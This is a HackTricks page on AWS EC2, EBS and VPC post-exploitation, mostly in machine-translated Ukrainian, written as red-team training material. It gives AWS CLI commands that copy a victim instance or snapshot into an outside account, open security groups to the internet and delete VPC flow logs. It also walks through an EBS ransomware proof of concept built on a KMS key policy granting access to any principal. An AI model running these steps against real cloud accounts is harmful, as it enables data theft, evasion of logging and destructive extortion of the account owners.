# AWS - EC2, EBS, SSM & VPC Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EC2 & VPC

For more information check:

{% content-ref url="../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **–¥—É–±–ª—é—î –≤—Ö—ñ–¥–Ω–∏–π —Ç–∞ –≤–∏—Ö—ñ–¥–Ω–∏–π —Ç—Ä–∞—Ñ—ñ–∫ –¥–ª—è EC2 —ñ–Ω—Å—Ç–∞–Ω—Å—ñ–≤ —É VPC** –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ —â–æ—Å—å –Ω–∞ —Å–∞–º–∏—Ö —ñ–Ω—Å—Ç–∞–Ω—Å–∞—Ö. –¶–µ–π –¥—É–±–ª—å–æ–≤–∞–Ω–∏–π —Ç—Ä–∞—Ñ—ñ–∫ –∑–∞–∑–≤–∏—á–∞–π –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç —Å–∏—Å—Ç–µ–º–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–∏—Ö –≤—Ç–æ—Ä–≥–Ω–µ–Ω—å (IDS) –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É —Ç–∞ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É.\
–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º, —â–æ–± –∑–∞—Ö–æ–ø–∏—Ç–∏ –≤–µ—Å—å —Ç—Ä–∞—Ñ—ñ–∫ —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑ –Ω—å–æ–≥–æ:

For more information check this page:

{% content-ref url="aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### Copy Running Instance

–Ü–Ω—Å—Ç–∞–Ω—Å–∏ –∑–∞–∑–≤–∏—á–∞–π –º—ñ—Å—Ç—è—Ç—å —è–∫–∏–π—Å—å —á—É—Ç–ª–∏–≤–∏–π —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é. –Ñ —Ä—ñ–∑–Ω—ñ —Å–ø–æ—Å–æ–±–∏ –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—É (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc.md)). –û–¥–Ω–∞–∫ —ñ–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ –≤—ñ–Ω –º—ñ—Å—Ç–∏—Ç—å, —Ü–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ AMI —Ç–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –Ω–æ–≤–∏–π —ñ–Ω—Å—Ç–∞–Ω—Å (–Ω–∞–≤—ñ—Ç—å —É –≤–∞—à–æ–º—É –≤–ª–∞—Å–Ω–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ) –∑ –Ω—å–æ–≥–æ**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**–°–Ω—ñ–º–∫–∏ —î —Ä–µ–∑–µ—Ä–≤–Ω–∏–º–∏ –∫–æ–ø—ñ—è–º–∏ —Ç–æ–º—ñ–≤**, —è–∫—ñ –∑–∞–∑–≤–∏—á–∞–π –º—ñ—Å—Ç–∏—Ç–∏–º—É—Ç—å **—á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**, —Ç–æ–º—É —ó—Ö –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–æ–≤–∏–Ω–Ω–∞ —Ä–æ–∑–∫—Ä–∏—Ç–∏ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.\
–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **—Ç–æ–º –±–µ–∑ —Å–Ω—ñ–º–∫–∞**, –≤–∏ –º–æ–∂–µ—Ç–µ: **–°—Ç–≤–æ—Ä–∏—Ç–∏ —Å–Ω—ñ–º–æ–∫** —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –¥—ñ—ó –∞–±–æ –ø—Ä–æ—Å—Ç–æ **–ø—ñ–¥–∫–ª—é—á–∏—Ç–∏ –π–æ–≥–æ –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É:

{% content-ref url="aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### Data Exfiltration

#### DNS Exfiltration

–ù–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –∑–∞–±–ª–æ–∫—É—î—Ç–µ EC2, —â–æ–± –∂–æ–¥–µ–Ω —Ç—Ä–∞—Ñ—ñ–∫ –Ω–µ –º—ñ–≥ –≤–∏–π—Ç–∏, –≤—ñ–Ω –≤—Å–µ —â–µ –º–æ–∂–µ **–µ–∫—Å—Ç—Ä–∞–≥—É–≤–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ DNS**.

* **VPC Flow Logs –Ω–µ –∑–∞—Ñ—ñ–∫—Å—É—é—Ç—å —Ü–µ**.
* –£ –≤–∞—Å –Ω–µ–º–∞—î –¥–æ—Å—Ç—É–ø—É –¥–æ AWS DNS –∂—É—Ä–Ω–∞–ª—ñ–≤.
*   –í–∏–º–∫–Ω—ñ—Ç—å —Ü–µ, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ "enableDnsSupport" –Ω–∞ false –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ API –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, —è–∫–∏–º –≤—ñ–Ω –∫–µ—Ä—É—î. Cloudtrail –∑–∞—Ñ—ñ–∫—Å—É—î —Ü—ñ –≤–∏–∫–ª–∏–∫–∏, —ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ –ø–æ–±–∞—á–∏—Ç–∏ –µ–∫—Å—Ç—Ä–∞–≥–æ–≤–∞–Ω—ñ –¥–∞–Ω—ñ –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö Cloudtrail.

### Open Security Group

–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ–¥–∞–ª—å—à–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –º–µ—Ä–µ–∂–µ–≤–∏—Ö —Å–µ—Ä–≤—ñ—Å—ñ–≤, –≤—ñ–¥–∫—Ä–∏–≤—à–∏ –ø–æ—Ä—Ç–∏ —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### Privesc to ECS

–ú–æ–∂–ª–∏–≤–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ EC2 –µ–∫–∑–µ–º–ø–ª—è—Ä —ñ –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–ª—è –∑–∞–ø—É—Å–∫—É ECS –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤, –∞ –ø–æ—Ç—ñ–º –≤–∫—Ä–∞—Å—Ç–∏ –¥–∞–Ω—ñ ECS –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤.

–î–ª—è [**–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### –í–∏–¥–∞–ª–∏—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏ –ø–æ—Ç–æ–∫—É VPC
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### –ü–æ–¥—ñ–ª–∏—Ç–∏—Å—è AMI

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### –ü–æ—à—É–∫ —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ –ø—É–±–ª—ñ—á–Ω–∏—Ö —Ç–∞ –ø—Ä–∏–≤–∞—Ç–Ω–∏—Ö AMI

* [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è **–ø–æ—à—É–∫—É —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ –ø—É–±–ª—ñ—á–Ω–∏—Ö –∞–±–æ –ø—Ä–∏–≤–∞—Ç–Ω–∏—Ö –æ–±—Ä–∞–∑–∞—Ö Amazon Machine Images (AMIs)**. –í—ñ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É—î –ø—Ä–æ—Ü–µ—Å –∑–∞–ø—É—Å–∫—É –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ –∑ —Ü—ñ–ª—å–æ–≤–∏—Ö AMI, –º–æ–Ω—Ç—É–≤–∞–Ω–Ω—è —ó—Ö —Ç–æ–º—ñ–≤ —Ç–∞ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏—Ö —Å–µ–∫—Ä–µ—Ç—ñ–≤ –∞–±–æ —á—É—Ç–ª–∏–≤–∏—Ö –¥–∞–Ω–∏—Ö.

### –ü–æ–¥—ñ–ª–∏—Ç–∏—Å—è –∑–Ω—ñ–º–∫–æ–º EBS

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Ransomware PoC

–î–æ–∫–∞–∑ –∫–æ–Ω—Ü–µ–ø—Ü—ñ—ó, –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—ó Ransomware, –ø–æ–∫–∞–∑–∞–Ω–æ—ó –≤ –Ω–æ—Ç–∞—Ç–∫–∞—Ö –ø–æ—Å—Ç-–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó S3. KMS —Å–ª—ñ–¥ –ø–µ—Ä–µ–π–º–µ–Ω—É–≤–∞—Ç–∏ –Ω–∞ RMS –¥–ª—è Ransomware Management Service, –∑ –æ–≥–ª—è–¥—É –Ω–∞ —Ç–µ, —è–∫ –ª–µ–≥–∫–æ –π–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ä—ñ–∑–Ω–∏—Ö —Å–µ—Ä–≤—ñ—Å—ñ–≤ AWS.

–°–ø–æ—á–∞—Ç–∫—É –∑ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É '–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞' AWS —Å—Ç–≤–æ—Ä—ñ—Ç—å –∫–ª—é—á, –∫–µ—Ä–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, —É KMS. –î–ª—è —Ü—å–æ–≥–æ –ø—Ä–∏–∫–ª–∞–¥—É –º–∏ –ø—Ä–æ—Å—Ç–æ –¥–æ–∑–≤–æ–ª–∏–º–æ AWS –∫–µ—Ä—É–≤–∞—Ç–∏ –¥–∞–Ω–∏–º–∏ –∫–ª—é—á–∞ –∑–∞ –º–µ–Ω–µ, –∞–ª–µ –≤ —Ä–µ–∞–ª—ñ—Å—Ç–∏—á–Ω–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ –¥–∞–Ω—ñ –∫–ª—é—á–∞ –ø–æ–∑–∞ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º AWS. –ó–º—ñ–Ω—ñ—Ç—å –ø–æ–ª—ñ—Ç–∏–∫—É –∫–ª—é—á–∞, —â–æ–± –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –±—É–¥—å-—è–∫–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É AWS Principal –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–ª—é—á. –î–ª—è —Ü—ñ—î—ó –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–ª—é—á–∞ —ñ–º'—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –±—É–ª–æ 'AttackSim', –∞ –ø—Ä–∞–≤–∏–ª–æ –ø–æ–ª—ñ—Ç–∏–∫–∏, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–µ—Å—å –¥–æ—Å—Ç—É–ø, –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
–ü—Ä–∞–≤–∏–ª–æ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–ª—é—á–∞ –ø–æ—Ç—Ä–µ–±—É—î –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ, —â–æ–± –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –π–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –æ–±—Å—è–≥—É EBS:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

–¢–µ–ø–µ—Ä, –º–∞—é—á–∏ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∏–π –∫–ª—é—á –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è. –ú–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å '–∂–µ—Ä—Ç–≤–∏', –≤ —è–∫–æ–º—É –∑–∞–ø—É—â–µ–Ω—ñ –¥–µ—è–∫—ñ EC2 –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ –∑ –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏–º–∏ –Ω–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º–∏ –æ–±—Å—è–≥–∞–º–∏ EBS. –û–±—Å—è–≥–∏ EBS —Ü—å–æ–≥–æ '–∂–µ—Ä—Ç–≤–∏' —î –Ω–∞—à–æ—é –º–µ—Ç–æ—é –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è, —Ü—è –∞—Ç–∞–∫–∞ –∑–¥—ñ–π—Å–Ω—é—î—Ç—å—Å—è –∑–∞ —É–º–æ–≤–æ—é –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

–ü–æ–¥—ñ–±–Ω–æ –¥–æ –ø—Ä–∏–∫–ª–∞–¥—É –∑ –ø—Ä–æ–≥—Ä–∞–º–æ—é-–≤–∏–º–∞–≥–∞—á–µ–º S3. –¶—è –∞—Ç–∞–∫–∞ —Å—Ç–≤–æ—Ä–∏—Ç—å –∫–æ–ø—ñ—ó –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –æ–±—Å—è–≥—ñ–≤ EBS, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∑–Ω—ñ–º–∫–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—î –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∏–π –∫–ª—é—á –∑ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É '–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞' –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –Ω–æ–≤–∏—Ö –æ–±—Å—è–≥—ñ–≤ EBS, –ø–æ—Ç—ñ–º –≤—ñ–¥'—î–¥–Ω–∞—î –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ –æ–±—Å—è–≥–∏ EBS –≤—ñ–¥ EC2 –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ —ñ –≤–∏–¥–∞–ª–∏—Ç—å —ó—Ö, –∞ –ø–æ—Ç—ñ–º –Ω–∞—Ä–µ—à—Ç—ñ –≤–∏–¥–∞–ª–∏—Ç—å –∑–Ω—ñ–º–∫–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–∏—Ö –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—Ö –æ–±—Å—è–≥—ñ–≤ EBS. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

–í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ –∑–∞–ª–∏—à–∞—Ç—å—Å—è –ª–∏—à–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –æ–±—Å—è–≥–∏ EBS, –¥–æ—Å—Ç—É–ø–Ω—ñ –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

–¢–∞–∫–æ–∂ –≤–∞—Ä—Ç–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —Å–∫—Ä–∏–ø—Ç –∑—É–ø–∏–Ω–∏–≤ EC2 –µ–∫–∑–µ–º–ø–ª—è—Ä–∏, —â–æ–± –≤—ñ–¥'—î–¥–Ω–∞—Ç–∏ —Ç–∞ –≤–∏–¥–∞–ª–∏—Ç–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ –æ–±—Å—è–≥–∏ EBS. –û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ –Ω–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –æ–±—Å—è–≥–∏ —Ç–µ–ø–µ—Ä –∑–Ω–∏–∫–ª–∏.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

–î–∞–ª—ñ, –ø–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–ª—é—á–∞ –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ '–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞' —ñ –≤–∏–¥–∞–ª—ñ—Ç—å –ø—Ä–∞–≤–∏–ª–æ –ø–æ–ª—ñ—Ç–∏–∫–∏ '–ó–æ–≤–Ω—ñ—à–Ω—î —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è' –∑ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–ª—é—á–∞.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
–ó–∞—á–µ–∫–∞–π—Ç–µ –º–æ–º–µ–Ω—Ç, –ø–æ–∫–∏ –Ω–æ–≤–∞ –ø–æ–ª—ñ—Ç–∏–∫–∞ –∫–ª—é—á–∞ –Ω–µ –ø–æ—à–∏—Ä–∏—Ç—å—Å—è. –ü–æ—Ç—ñ–º –ø–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É '–∂–µ—Ä—Ç–≤–∏' —ñ —Å–ø—Ä–æ–±—É–π—Ç–µ –ø—Ä–∏—î–¥–Ω–∞—Ç–∏ –æ–¥–∏–Ω –∑ –Ω–æ–≤–∏—Ö –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—Ö EBS-—Ç–æ–º—ñ–≤. –í–∏ –≤–∏—è–≤–∏—Ç–µ, —â–æ –º–æ–∂–µ—Ç–µ –ø—Ä–∏—î–¥–Ω–∞—Ç–∏ —Ç–æ–º.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

